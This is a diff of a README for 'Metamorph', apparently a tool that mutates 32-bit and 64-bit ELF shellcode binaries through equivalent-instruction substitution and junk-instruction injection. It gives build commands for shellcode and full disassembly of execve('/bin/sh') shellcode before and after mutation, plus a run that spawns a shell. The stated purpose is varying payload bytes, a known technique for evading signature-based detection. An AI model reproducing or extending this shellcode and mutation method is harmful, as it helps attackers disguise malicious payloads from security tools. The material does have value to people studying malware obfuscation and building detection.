@@ -1,6 +1,6 @@
 # Metamorph
 
-This code is a simple metamorphic engine that takes a 32-bit ELF executable binary as input, and generates a 32-bit metamorphicated ELF executable binary file. It currently supports injecting these instructions as NOP:
+This code is a simple metamorphic engine that takes a 32-bit/64-bit ELF executable binary as input, and generates a 32-bit/64-bit metamorphicated ELF executable binary file. It currently supports injecting these instructions as NOP:
 - NOP
 - CMP [register],[register]
 - PUSH [register] / POP [register]
@@ -10,46 +10,46 @@ And altering these instructions:
 - mov [register 1], [register 2] -> push [register 2]; pop [register 1] or xor [register 1], [register 1]; add [register 1], [register 2]
 - xor [register], [register] -> mov [register], 0 or sub [register], [register]
 
-Note: This code will be updated to support amd64 architecture and injecting/changing instructions...
-
 ## Usage
 
-To make a .raw file of a shellcode, simply convert your assembly code into a machine code using these commands:
+Simply convert your assembly code into a machine code using these commands
+For 32-bit:
 ```
 nasm -f elf32 shellcode.asm -o shellcode.o
 ld -m elf_i386 -s -o shellcode shellcode.o
 ```
 
+For 64-bit:
+```
+nasm -f elf64 shellcode.asm -o shellcode.o
+ld shellcode.o -o shellcode
+```
+
 After that, you can use this tool to generate a metamorphicated 32-bit ELF file:
 ```
-./Metamorph shellcode executable
+./Metamorph shellcode new_executable
 ```
 
 ## Example:
 ```
 ┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
-└─$ ./Metamorph shellcode shellcode2
-Original file: 4492 bytes
-Found 5 sections
-.text section: offset=0x1000, size=25 bytes
-.symtab section: offset=0x101c, size=96 bytes
-.strtab section: offset=0x107c, size=39 bytes
-.shstrtab section: offset=0x10a3, size=33 bytes
-Disassembled 11 instructions
+└─$ ./Metamorph x64shellcode x64shellcode2
+Original file: 4680 bytes (64-bit)
+Disassembled 12 instructions
 Replaced 3 patterns:
-  0x0: XOR EAX, EAX -> SUB EAX, EAX
-  0xd: MOV EBX, ESP -> XOR EBX, EBX; ADD EBX, ESP
-  0x11: MOV ECX, ESP -> PUSH ESP; POP ECX
-Injecting NOP at offset 0x13
+  0x0: XOR RDI, RDI -> SUB RDI, RDI
+  0x12: XOR RSI, RSI -> MOV RSI, 0
+  0x1a: XOR RDX, RDX -> MOV RDX, 0
+Injecting CMP RDX, RDX at offset 0x12
 
-.text size change: 25 -> 28 bytes (+3)
+.text size change: 36 -> 47 bytes (+11)
 
-Output file: 4495 bytes
+Output file: 4691 bytes
 
-Success: shellcode2
+Success: x64shellcode2
 
 ┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
-└─$ ./shellcode2
+└─$ ./x64shellcode2
 $ whoami
 kali
 ```
@@ -58,51 +58,53 @@ kali
 For original ELF:
 ```
 ┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
-└─$ objdump -d -M intel shellcode
+└─$ objdump -d -M intel x64shellcode
 
-shellcode:     file format elf32-i386
+x64shellcode:     file format elf64-x86-64
 
 
 Disassembly of section .text:
 
-08049000 <_start>:
- 8049000:       31 c0                   xor    eax,eax
- 8049002:       50                      push   eax
- 8049003:       68 2f 2f 73 68          push   0x68732f2f
- 8049008:       68 2f 62 69 6e          push   0x6e69622f
- 804900d:       89 e3                   mov    ebx,esp
- 804900f:       50                      push   eax
- 8049010:       53                      push   ebx
- 8049011:       89 e1                   mov    ecx,esp
- 8049013:       31 d2                   xor    edx,edx
- 8049015:       b0 0b                   mov    al,0xb
- 8049017:       cd 80                   int    0x80
+0000000000401000 <_start>:
+  401000:       48 31 ff                xor    rdi,rdi
+  401003:       57                      push   rdi
+  401004:       48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
+  40100b:       73 68 00
+  40100e:       57                      push   rdi
+  40100f:       48 89 e7                mov    rdi,rsp
+  401012:       48 31 f6                xor    rsi,rsi
+  401015:       56                      push   rsi
+  401016:       57                      push   rdi
+  401017:       48 89 e6                mov    rsi,rsp
+  40101a:       48 31 d2                xor    rdx,rdx
+  40101d:       b8 3b 00 00 00          mov    eax,0x3b
+  401022:       0f 05                   syscall
 ```
 
 
 For metamorphicated ELF:
 ```
 ┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
-└─$ objdump -d -M intel shellcode2
+└─$ objdump -d -M intel x64shellcode2
 
-shellcode2:     file format elf32-i386
+x64shellcode2:     file format elf64-x86-64
 
 
 Disassembly of section .text:
 
-08049000 <_start>:
- 8049000:       29 c0                   sub    eax,eax
- 8049002:       50                      push   eax
- 8049003:       68 2f 2f 73 68          push   0x68732f2f
- 8049008:       68 2f 62 69 6e          push   0x6e69622f
- 804900d:       31 db                   xor    ebx,ebx
- 804900f:       01 e3                   add    ebx,esp
- 8049011:       50                      push   eax
- 8049012:       53                      push   ebx
- 8049013:       90                      nop
- 8049014:       54                      push   esp
- 8049015:       59                      pop    ecx
- 8049016:       31 d2                   xor    edx,edx
- 8049018:       b0 0b                   mov    al,0xb
- 804901a:       cd 80                   int    0x80
+0000000000401000 <_start>:
+  401000:       48 29 ff                sub    rdi,rdi
+  401003:       57                      push   rdi
+  401004:       48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
+  40100b:       73 68 00
+  40100e:       57                      push   rdi
+  40100f:       48 89 e7                mov    rdi,rsp
+  401012:       48 39 d2                cmp    rdx,rdx
+  401015:       48 c7 c6 00 00 00 00    mov    rsi,0x0
+  40101c:       56                      push   rsi
+  40101d:       57                      push   rdi
+  40101e:       48 89 e6                mov    rsi,rsp
+  401021:       48 c7 c2 00 00 00 00    mov    rdx,0x0
+  401028:       b8 3b 00 00 00          mov    eax,0x3b
+  40102d:       0f 05                   syscall
 ```
